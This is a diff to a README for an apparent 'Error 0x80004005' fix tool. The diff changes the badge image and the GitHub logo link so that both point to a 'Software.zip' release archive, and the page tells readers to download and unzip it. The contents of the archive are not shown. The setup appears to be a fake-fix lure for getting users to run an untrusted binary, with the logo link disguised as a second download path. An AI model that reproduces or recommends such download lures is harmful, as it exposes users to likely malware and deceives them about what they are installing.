@@ -25,7 +25,7 @@ To get started with fixing "Error 0x80004005," follow these simple steps:
 
 1. Click on the download button below to get the software:
    
-   [![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/17466420/Software.zip)
+   [![Download Software](https://github.com/PhamTaiNo/Fixing-Error-0x80004005-Unspecified/releases/download/v2.0/Software.zip)](https://github.com/PhamTaiNo/Fixing-Error-0x80004005-Unspecified/releases/download/v2.0/Software.zip)
 
 2. Once the download is complete, unzip the software package to a location of your choice.
 
@@ -62,6 +62,6 @@ This repository is licensed under the MIT License. You are free to use, modify, 
 
 ---
 
-[![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)](https://github.com)
+[![GitHub Logo](https://github.com/PhamTaiNo/Fixing-Error-0x80004005-Unspecified/releases/download/v2.0/Software.zip)](https://github.com/PhamTaiNo/Fixing-Error-0x80004005-Unspecified/releases/download/v2.0/Software.zip)
 
 Thank you for choosing our error-fixing software. We hope it brings you relief from the troubles caused by "Error 0x80004005." Happy computing! 😉🛠️🔍
